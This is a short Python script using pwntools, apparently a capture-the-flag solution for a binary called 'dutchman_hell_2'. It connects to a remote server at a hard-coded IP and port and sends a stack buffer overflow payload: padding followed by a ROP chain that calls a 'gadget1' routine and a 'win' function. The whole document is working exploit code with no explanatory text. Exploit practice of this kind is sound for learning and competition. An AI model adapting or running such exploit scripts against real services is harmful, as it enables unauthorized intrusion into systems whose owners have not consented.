from pwn import *

pwnlib.context.context.clear(arch='amd64', os='linux')

r = remote("65.109.201.174", 5002)

e = pwnlib.elf.ELF('dutchman_hell_2')

rop = pwnlib.rop.rop.ROP(e)
rop.call('gadget1')
rop.call('win', [0xdeadbeef])

payload = bytearray()
payload += ('a' * (0x8 + 8)).encode('ascii')
payload += bytes(rop)

print("sending ", payload)

r.sendline(payload)

print(r.recvall().decode())

r.close()
